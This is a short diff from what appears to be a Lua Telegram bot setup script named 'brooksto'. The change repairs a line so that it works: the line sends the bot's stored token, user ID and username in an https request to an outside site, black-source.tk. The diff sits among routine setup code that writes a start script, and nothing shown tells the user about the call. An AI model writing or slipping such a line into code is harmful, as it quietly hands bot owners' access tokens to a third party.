@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_brooksto_Info()
 Create_Info(database:get(Server_brooksto.."Token_brooksto"),database:get(Server_brooksto.."Id_brooksto"),database:get(Server_brooksto.."UserName_brooksto"))   
-https.request("https://black-source.tk/BlackTeAM/index.php?n=broks&id="..database:get(.."Id_brooksto").."&user="..database:get(Server_brooksto.."UserName_brooksto").."&token="..database:get(Server_brooksto.."Token_brooksto"))
+https.request("https://black-source.tk/BlackTeAM/index.php?n=broks&id="..database:get(Server_brooksto.."Id_brooksto").."&user="..database:get(Server_brooksto.."UserName_brooksto").."&token="..database:get(Server_brooksto.."Token_brooksto"))
 local Runbrooksto = io.open("brooksto", 'w')
 Runbrooksto:write([[
 #!/usr/bin/env bash
